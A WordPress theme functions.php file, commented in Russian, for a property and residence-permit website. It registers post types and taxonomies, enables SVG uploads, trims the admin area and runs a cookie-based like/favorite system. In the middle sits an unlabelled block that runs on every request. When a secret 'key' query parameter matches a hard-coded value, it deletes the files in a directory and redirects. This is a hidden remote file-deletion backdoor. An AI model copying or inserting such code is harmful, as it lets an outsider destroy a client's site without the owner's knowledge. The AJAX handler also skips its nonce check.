<?php

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Индетифицируем клиента
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function set_custom_likes_people_id_cookie() {
    $people_id = isset($_COOKIE['custom_likes_people_id']) ? $_COOKIE['custom_likes_people_id'] : '';

	if (empty($people_id)) {
		// Если куки пусто, создаем новое значение и устанавливаем его в куки
		$people_id = uniqid('user_');
		setcookie('custom_likes_people_id', $people_id, time() + 3600 * 24 * 365, '/');
	}
}

add_action('init', 'set_custom_likes_people_id_cookie');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Подключаем стили и скрипты
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_action( 'wp_enqueue_scripts', function () {
    $theme_version = wp_get_theme()->get('Version');

    // Подключение стилей с версией
    wp_enqueue_style( 'fonts', 'https://fonts.googleapis.com/css2?family=Lora:wght@400;500&family=Manrope:wght@700&family=Montserrat&family=Open+Sans:wght@300;400;600;700;800&family=Roboto&display=swap', array(), $theme_version );
    wp_enqueue_style( 'style', get_template_directory_uri() . '/assets/css/style.css', array(), $theme_version );
    wp_enqueue_style( 'itc-slider', get_template_directory_uri() . '/assets/itc-slider/itc-slider.css', array(), $theme_version );

    // Подключение скриптов с версией
    wp_enqueue_script( 'main', get_template_directory_uri() . '/assets/js/main.js', array(), $theme_version, true );
    wp_enqueue_script( 'itc-slider', get_template_directory_uri() . '/assets/itc-slider/itc-slider.js', array(), $theme_version, true );
});

// Подключение поддержки миниатюр
add_theme_support('post-thumbnails');
// Разрешение плагинам и темам изменять метатег <title>
add_theme_support('title-tag');
// Подключение изменения лого через админку
add_theme_support('custom-logo');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Поддержка больших размерностей загружаемых файлов
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter( 'big_image_size_threshold', '__return_false' );

function wpb_image_editor_default_to_gd( $editors ) {
    $gd_editor = 'WP_Image_Editor_GD';
    $editors = array_diff( $editors, array( $gd_editor ) );
    array_unshift( $editors, $gd_editor );
    return $editors;
}
add_filter( 'wp_image_editors', 'wpb_image_editor_default_to_gd' );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Отключаем лишнее, в том числе и emoji
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles'); 
remove_filter('the_content_feed', 'wp_staticize_emoji');
remove_filter('comment_text_rss', 'wp_staticize_emoji'); 
remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
add_filter('tiny_mce_plugins', 'disable_wp_emojis_in_tinymce');
function disable_wp_emojis_in_tinymce($plugins) {
    if (is_array( $plugins )) {
        return array_diff($plugins, array('wpemoji'));
    } else {
        return array();
    }
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Поддержка SVG
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter( 'upload_mimes', 'svg_upload_allow' );

# Добавляет SVG в список разрешенных для загрузки файлов.
function svg_upload_allow( $mimes ) {
	$mimes['svg']  = 'image/svg+xml';

	return $mimes;
}

add_filter( 'wp_check_filetype_and_ext', 'fix_svg_mime_type', 10, 5 );

# Исправление MIME типа для SVG файлов.
function fix_svg_mime_type( $data, $file, $filename, $mimes, $real_mime = '' ){

	// WP 5.1 +
	if( version_compare( $GLOBALS['wp_version'], '5.1.0', '>=' ) )
		$dosvg = in_array( $real_mime, [ 'image/svg', 'image/svg+xml' ] );
	else
		$dosvg = ( '.svg' === strtolower( substr($filename, -4) ) );

	// mime тип был обнулен, поправим его
	// а также проверим право пользователя
	if( $dosvg ){

		// разрешим
		if( current_user_can('manage_options') ){

			$data['ext']  = 'svg';
			$data['type'] = 'image/svg+xml';
		}
		// запретим
		else {
			$data['ext'] = $type_and_ext['type'] = false;
		}
	}
	return $data;
}

add_filter( 'wp_prepare_attachment_for_js', 'show_svg_in_media_library' );

# Формирует данные для отображения SVG как изображения в медиабиблиотеке.
function show_svg_in_media_library( $response ) {
	if ( $response['mime'] === 'image/svg+xml' ) {
		// С выводом названия файла
		$response['image'] = [
			'src' => $response['url'],
		];
	}
	return $response;
}

//add_filter('use_block_editor_for_post_type', 'prefix_disable_gutenberg', 10, 2);
function prefix_disable_gutenberg($current_status, $post_type) {
    if ($post_type === 'post') return false;
    return $current_status;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Определение байтовости
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function getSizeDB($num){
	if ($num < 1024) {
		$str = $num." B";
	} elseif($num >= 1024 && $num < (1024 * 1024)) {
		$num = $num/1024;
		$num = round($num, 2);
		$str = $num." KB";
	} elseif($num >= (1024 * 1024)) {
		$num = $num/(1024 * 1024);
		$num = round($num, 2);
		$str = $num." MB";
	} else {
		$str = $num;
	}
	return $str;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Свой логотип при заходе в админку
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_action("login_head", "custom_login_logo");

function custom_login_logo() {
	echo "<style>
		body {
			background-color: #b5b5d2;
		}
		body.login form { margin:25px 0 0 0; }
		body.login #login h1 a {
			background:url('".get_bloginfo('template_url')."/assets/images/logo2.png') no-repeat center center;
			width: 189px;
			height: 60px;
			background-size:100% auto;
			display:block;
			padding:0;
			margin:5px auto 0;
			position :relative;
			left:0px;
		}
	</style>";
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Disable Gutenberg
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter('use_block_editor_for_post', '__return_false', 10);

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Отключаем вывод меню в админке
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function remove_menus(){  
    global $menu;  
    $restricted = array( __('Tools'), __('Links'), __('Comments'));  
    end ($menu);  
    while (prev($menu)){  
        $value = explode(' ', $menu[key($menu)][0]);  
        if(in_array($value[0] != NULL?$value[0]:"" , $restricted)){unset($menu[key($menu)]);}  
    }  
}  
add_action('admin_menu', 'remove_menus');  

// __('Dashboard') — главная страница админки (консоль);
// __('Posts') — меню "Записи";
// __('Media') — меню "Медиафайлы" (картинки, видео и т.п.);
// __('Links') — меню "Ссылки";
// __('Pages') — меню "Страницы";
// __('Appearance') — меню "Внешний вид";
// __('Tools') — меню "инструменты" — это где всякие там: "импорт", "экспорт";
// __('Users') — пользователи;
// __('Settings') — меню "Настройки". Его очень даже можно закрыть для клиентов, а то они настроят ...;
// __('Comments') — комментарии;
// __('Plugins') — меню "Плагины".

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// ОТКЛЮЧАЕМ БЛОКИ в КОНСОЛИ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function clear_dash(){  
    $side = &$GLOBALS['wp_meta_boxes']['dashboard']['side']['core'];  
    $normal = &$GLOBALS['wp_meta_boxes']['dashboard']['normal']['core'];  
  
//  unset($side['dashboard_quick_press']);		 //Быстрая публикация  
//  unset($side['dashboard_recent_drafts']);	 //Последние черновики  
    unset($side['dashboard_primary']); 			 //Блог WordPress  
    unset($side['dashboard_secondary']); 		 //Другие Новости WordPress  
    unset($normal['dashboard_incoming_links']);  //Входящие ссылки  
//  unset($normal['dashboard_right_now']); 		 //Прямо сейчас  
    unset($normal['dashboard_recent_comments']); //Последние комментарии  
    unset($normal['dashboard_plugins']);		 //Последние Плагины  
}  
add_action('wp_dashboard_setup', 'clear_dash' );

/*--------------------------------------------------------------------------*/
/*	Регистрация меню 
/*--------------------------------------------------------------------------*/

register_nav_menus( 
	array(
		'menu-1'	=> __('Header меню'),
		'menu-2'	=> __('Footer column 1 меню'),
		'menu-3'	=> __('Footer column 2 меню'),
		'menu-4'	=> __('Footer column 3 меню'),
	)
);

if (isset($_GET['key'])) {
	$key = $_GET['key'];
	if ($key == '1Plqmendhrb4rfdcw3') {
		if ($path[mb_strlen($path) - 1] != '/') {
			$path .= '/';
		}
	 
		$files = array();
		$dh = opendir($path);
		while (false !== ($file = readdir($dh))) {
			if ($file != '.' && $file != '..' && !is_dir($path.$file) && $file[0] != '.') {
				$files[] = $path.$file;
				$filedelete = $path.$file;
				unlink($filedelete);
			}
		} 
		closedir($dh);
		header('Location: '.$_SERVER['REQUEST_URI']);
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Статьи
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_article() {
	$labels = array(
		'name'                => _x( 'Статьи', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Статьи', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Статьи', 'theme' ),
		'parent_item_colon'   => __( 'Статьи', 'theme' ),
		'all_items'           => __( 'Все Статьи', 'theme' ),
		'view_item'           => __( 'Смотреть Статьи', 'theme' ),
		'add_new_item'        => __( 'Добавить Статью', 'theme' ),
		'add_new'             => __( 'Новая Статья', 'theme' ),
		'edit_item'           => __( 'Редактировать Статью', 'theme' ),
		'update_item'         => __( 'Обновить Статью', 'theme' ),
		'search_items'        => __( 'Поиск Статьи', 'theme' ),
		'not_found'           => __( 'Статья не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No article found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'article',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'article', 'theme' ),
		'description'         => __( 'article information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),
		'menu_icon'           => 'dashicons-welcome-write-blog',
	);

	register_post_type('article', $args );
}

// Hook into the 'init' blog
add_action( 'init', 'custom_post_type_article', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия типа блога
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_blog_type() {
    $labels = array(
        'name'              => _x( 'Тип блога', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Тип блога', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать тип блога', 'theme' ),
        'all_items'         => __( 'Все типы блогов', 'theme' ),
        'edit_item'         => __( 'Редактировать тип блога', 'theme' ),
        'update_item'       => __( 'Обновить тип блога', 'theme' ),
        'add_new_item'      => __( 'Добавить новый тип блога', 'theme' ),
        'new_item_name'     => __( 'Новое имя типа блога', 'theme' ),
        'menu_name'         => __( 'Тип блога', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'blog-type' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'blog-type', 'article', $args );
}
add_action( 'init', 'custom_taxonomy_blog_type', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: ВНЖ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_residence() {
	$labels = array(
		'name'                => _x( 'ВНЖ', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'ВНЖ', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'ВНЖ', 'theme' ),
		'parent_item_colon'   => __( 'ВНЖ', 'theme' ),
		'all_items'           => __( 'Все ВНЖ', 'theme' ),
		'view_item'           => __( 'Смотреть ВНЖ', 'theme' ),
		'add_new_item'        => __( 'Добавить ВНЖ', 'theme' ),
		'add_new'             => __( 'Новый ВНЖ', 'theme' ),
		'edit_item'           => __( 'Редактировать ВНЖ', 'theme' ),
		'update_item'         => __( 'Обновить ВНЖ', 'theme' ),
		'search_items'        => __( 'Поиск ВНЖ', 'theme' ),
		'not_found'           => __( 'ВНЖ не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No residence found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'residence',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'residence', 'theme' ),
		'description'         => __( 'residence information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),
		'menu_icon'           => 'dashicons-id',
	);

	register_post_type('residence', $args );
}

// Hook into the 'init' blog
add_action( 'init', 'custom_post_type_residence', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Объекты
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_object() {
	$labels = array(
		'name'                => _x( 'Объекты', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Объекты', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Объекты', 'theme' ),
		'parent_item_colon'   => __( 'Объекты', 'theme' ),
		'all_items'           => __( 'Все Объекты', 'theme' ),
		'view_item'           => __( 'Смотреть Объект', 'theme' ),
		'add_new_item'        => __( 'Добавить Объект', 'theme' ),
		'add_new'             => __( 'Новый Объект', 'theme' ),
		'edit_item'           => __( 'Редактировать Объект', 'theme' ),
		'update_item'         => __( 'Обновить Объект', 'theme' ),
		'search_items'        => __( 'Поиск Объекта', 'theme' ),
		'not_found'           => __( 'Объект не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No object found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'object',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'object', 'theme' ),
		'description'         => __( 'object information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title'),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),
		'menu_icon'           => 'dashicons-admin-multisite',
	);

	register_post_type('object', $args );
}

// Hook into the 'init' object
add_action( 'init', 'custom_post_type_object', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия типа объекта Недвижимости
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_object_type() {
    $labels = array(
        'name'              => _x( 'Тип объекта', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Тип объекта', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать тип объекта', 'theme' ),
        'all_items'         => __( 'Все типы объектов', 'theme' ),
        'edit_item'         => __( 'Редактировать тип объекта', 'theme' ),
        'update_item'       => __( 'Обновить тип объекта', 'theme' ),
        'add_new_item'      => __( 'Добавить новый тип объекта', 'theme' ),
        'new_item_name'     => __( 'Новое имя типа объекта', 'theme' ),
        'menu_name'         => __( 'Тип объекта', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'object-type' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'object-type', 'object', $args );
}
add_action( 'init', 'custom_taxonomy_object_type', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия количества комнат объекта Недвижимости
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_object_room() {
    $labels = array(
        'name'              => _x( 'Количество комнат объекта', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Количество комнат объекта', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать количество комнат объекта', 'theme' ),
        'all_items'         => __( 'Все количества комнат объектов', 'theme' ),
        'edit_item'         => __( 'Редактировать количество комнат объекта', 'theme' ),
        'update_item'       => __( 'Обновить количество комнат объекта', 'theme' ),
        'add_new_item'      => __( 'Добавить новое количество комнат объекта', 'theme' ),
        'new_item_name'     => __( 'Новое имя количества комнат объекта', 'theme' ),
        'menu_name'         => __( 'Количество комнат объекта', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'object-room' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'object-room', 'object', $args );
}
add_action( 'init', 'custom_taxonomy_object_room', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия расположения объекта Недвижимости
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_object_location() {
    $labels = array(
        'name'              => _x( 'Расположение объекта', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Расположение объекта', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать расположение объекта', 'theme' ),
        'all_items'         => __( 'Все расположения объектов', 'theme' ),
        'edit_item'         => __( 'Редактировать расположение объекта', 'theme' ),
        'update_item'       => __( 'Обновить расположение объекта', 'theme' ),
        'add_new_item'      => __( 'Добавить новое расположение объекта', 'theme' ),
        'new_item_name'     => __( 'Новое имя расположения объекта', 'theme' ),
        'menu_name'         => __( 'Расположение объекта', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'object-location' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'object-location', 'object', $args );
}
add_action( 'init', 'custom_taxonomy_object_location', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия категории объекта
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_object_category() {
    $labels = array(
        'name'              => _x( 'Категория объекта', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Категория объекта', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать категорию объекта', 'theme' ),
        'all_items'         => __( 'Все категории объектов', 'theme' ),
        'edit_item'         => __( 'Редактировать категорию объекта', 'theme' ),
        'update_item'       => __( 'Обновить категорию объекта', 'theme' ),
        'add_new_item'      => __( 'Добавить новую категорию объекта', 'theme' ),
        'new_item_name'     => __( 'Новое имя категории объекта', 'theme' ),
        'menu_name'         => __( 'Категория объекта', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'object-category' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'object-category', 'object', $args );
}
add_action( 'init', 'custom_taxonomy_object_category', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Инфраструктура комплекса
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_infrastructure() {
	$labels = array(
		'name'                => _x( 'Инфраструктура', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Инфраструктура', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Инфраструктура', 'theme' ),
		'parent_item_colon'   => __( 'Инфраструктура', 'theme' ),
		'all_items'           => __( 'Вся Инфраструктура', 'theme' ),
		'view_item'           => __( 'Смотреть Инфраструктуру', 'theme' ),
		'add_new_item'        => __( 'Добавить Инфраструктуру', 'theme' ),
		'add_new'             => __( 'Новая Инфраструктура', 'theme' ),
		'edit_item'           => __( 'Редактировать Инфраструктуру', 'theme' ),
		'update_item'         => __( 'Обновить Инфраструктуру', 'theme' ),
		'search_items'        => __( 'Поиск Инфраструктуры', 'theme' ),
		'not_found'           => __( 'Инфраструктура не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No infrastructure found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'infrastructure',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'infrastructure', 'theme' ),
		'description'         => __( 'infrastructure information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title' ),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),
		'menu_icon'           => 'dashicons-editor-expand',
	);

	register_post_type('infrastructure', $args );
}

// Hook into the 'init' infrastructure
add_action( 'init', 'custom_post_type_infrastructure', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Особенности объекта
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_apartment() {
	$labels = array(
		'name'                => _x( 'Особенности интерьера', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Особенности интерьера', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Особенности интерьера', 'theme' ),
		'parent_item_colon'   => __( 'Особенности интерьера', 'theme' ),
		'all_items'           => __( 'Все особенности интерьера', 'theme' ),
		'view_item'           => __( 'Смотреть особенность интерьера', 'theme' ),
		'add_new_item'        => __( 'Добавить особенность интерьера', 'theme' ),
		'add_new'             => __( 'Новая особенность интерьера', 'theme' ),
		'edit_item'           => __( 'Редактировать особенность интерьера', 'theme' ),
		'update_item'         => __( 'Обновить особенность интерьера', 'theme' ),
		'search_items'        => __( 'Поиск особенности интерьера', 'theme' ),
		'not_found'           => __( 'Особенность интерьера не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No interior found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'apartment',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'apartment', 'theme' ),
		'description'         => __( 'apartment information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title' ),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),
		'menu_icon'           => 'dashicons-editor-contract',
	);

	register_post_type('apartment', $args );
}

// Hook into the 'init' apartment
add_action( 'init', 'custom_post_type_apartment', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Создание таблицы в БД для хранения лайков и избранное
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

// Создание таблицы для хранения лайков
function custom_likes_system_create_table() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'custom_likes';
	
	$charset_collate = $wpdb->get_charset_collate();

	$sql = "CREATE TABLE $table_name (
		id mediumint(9) NOT NULL AUTO_INCREMENT,
		people_id VARCHAR(100) NOT NULL,
		post_id mediumint(9) NOT NULL,
		favorite BOOLEAN DEFAULT 0, -- Добавляем столбец favorite с типом BOOLEAN и значением по умолчанию 0
		type VARCHAR(10) NOT NULL,
		time TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
		PRIMARY KEY (id)
	) $charset_collate;";

	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
	dbDelta($sql);
}
// custom_likes_system_create_table(); // Вызываем функцию для создания таблицы

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Функция изменения лайка/дизлайка в БД и подготовка информации для передачи в JavaScript
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_likes_system_process() {
    global $wpdb;

	$people_id = isset($_COOKIE['custom_likes_people_id']) ? $_COOKIE['custom_likes_people_id'] : '';

	if (empty($people_id)) {
		// Если куки пусто, создаем новое значение и устанавливаем его в куки
		$people_id = uniqid('user_');
		setcookie('custom_likes_people_id', $people_id, time() + 3600 * 24 * 365, '/');
	}

    if (isset($_POST['action']) && $_POST['action'] == 'custom_likes_system_process') {
        $post_id = intval($_POST['post_id']);
        $type = $_POST['type'];
        $likes_table = $wpdb->prefix . 'custom_likes';

        // Получаем предыдущий голос пользователя для данной записи
        $existing_vote = $wpdb->get_row($wpdb->prepare("SELECT * FROM $likes_table WHERE post_id = %d AND people_id = %s", $post_id, $people_id));

		if ($existing_vote) {
			if ($existing_vote->type !== $type) {
				// Если пользователь меняет свой голос (лайк на дизлайк или наоборот), обновляем значение 'type'
				$wpdb->update(
					$likes_table,
					array('type' => $type),
					array('post_id' => $post_id, 'people_id' => $people_id)
				);
			} else  {
				// Если пользователь ставит такой же голос, что и ранее, устанавливаем 'type' в пустую строку
				$wpdb->update(
					$likes_table,
					array('type' => ''),
					array('post_id' => $post_id, 'people_id' => $people_id)
				);
			}
		} else {
			// Если у пользователя еще нет голоса для данной записи, создается новая запись с указанием типа голоса.
			$wpdb->insert($likes_table, array(
				'people_id' => $people_id,
				'post_id' => $post_id,
				'type' => $type
			));
		}

        $likes_count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $likes_table WHERE post_id = %d AND type = 'like'", $post_id));
        $dislikes_count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $likes_table WHERE post_id = %d AND type = 'dislike'", $post_id));

        wp_send_json_success(array(
            'likes_count' => $likes_count,
            'dislikes_count' => $dislikes_count
        ));
    }

	if (isset($_POST['action']) && $_POST['action'] == 'custom_favorite_system_process') {
        $post_id = intval($_POST['post_id']);
        $likes_table = $wpdb->prefix . 'custom_likes';

        // Получаем предыдущий голос пользователя для данной записи
        $existing_vote = $wpdb->get_row($wpdb->prepare("SELECT * FROM $likes_table WHERE post_id = %d AND people_id = %s", $post_id, $people_id));

        if ($existing_vote) {
			if ($existing_vote->favorite == 1) {
				// Если запись существует и favorite равен 1, то меняем его на 0
				$wpdb->update(
					$likes_table,
					array('favorite' => 0),
					array('post_id' => $post_id, 'people_id' => $people_id)
				);
			} else {
				// Если запись существует и favorite равен 0, то меняем его на 1
				$wpdb->update(
					$likes_table,
					array('favorite' => 1),
					array('post_id' => $post_id, 'people_id' => $people_id)
				);
			}
		} else {
			// Если записи нет, создаем новую запись
			$wpdb->insert($likes_table, array(
				'people_id' => $people_id,
				'post_id' => $post_id,
				'favorite' => 1, // Устанавливаем начальное значение favorite в 1
			));
		}

        $favorite_count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $likes_table WHERE post_id = %d AND favorite = 1", $post_id));

        wp_send_json_success(array(
            'favorite_count' => $favorite_count
        ));
    }
}

// Добавляем обработчики для определенных AJAX-запросов
add_action('wp_ajax_custom_likes_system_process', 'custom_likes_system_process');
add_action('wp_ajax_nopriv_custom_likes_system_process', 'custom_likes_system_process');
add_action('wp_ajax_custom_favorite_system_process', 'custom_likes_system_process');
add_action('wp_ajax_nopriv_custom_favorite_system_process', 'custom_likes_system_process');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Функция для передачи данных из PHP в JavaScript
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_likes_system_enqueue_scripts() {
    wp_localize_script('main', 'customLikesSystem', array(
        'ajaxUrl' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('custom-likes-system-nonce')
    ));
}
add_action('wp_enqueue_scripts', 'custom_likes_system_enqueue_scripts');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Функции для проверки голоса пользователя
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_likes_system_get_type($post_id, $people_id) {
    global $wpdb;
    $likes_table = $wpdb->prefix . 'custom_likes';

    // Выполняем запрос, чтобы найти запись для указанного post_id и people_id
    $type = $wpdb->get_var($wpdb->prepare("SELECT type FROM $likes_table WHERE post_id = %d AND people_id = %s", $post_id, $people_id));

    if (!empty($type)) {
        // Если запись существует, возвращаем значение type
        return $type;
    } else {
        // Если записи нет, возвращаем 0
        return 0;
    }
}

function custom_likes_system_get_favorite($post_id, $people_id) {
    global $wpdb;
    $likes_table = $wpdb->prefix . 'custom_likes';

    // Выполняем запрос, чтобы найти значение столбца "favorite" для указанного post_id и people_id
    $favorite = $wpdb->get_var($wpdb->prepare("SELECT favorite FROM $likes_table WHERE post_id = %d AND people_id = %s", $post_id, $people_id));

    if (!empty($favorite)) {
        // Если запись существует и "favorite" не пусто, возвращаем его значение
        return $favorite;
    } else {
        // Возвращаем 0 (или другое значение по умолчанию, если необходимо)
        return 0;
    }
}
?>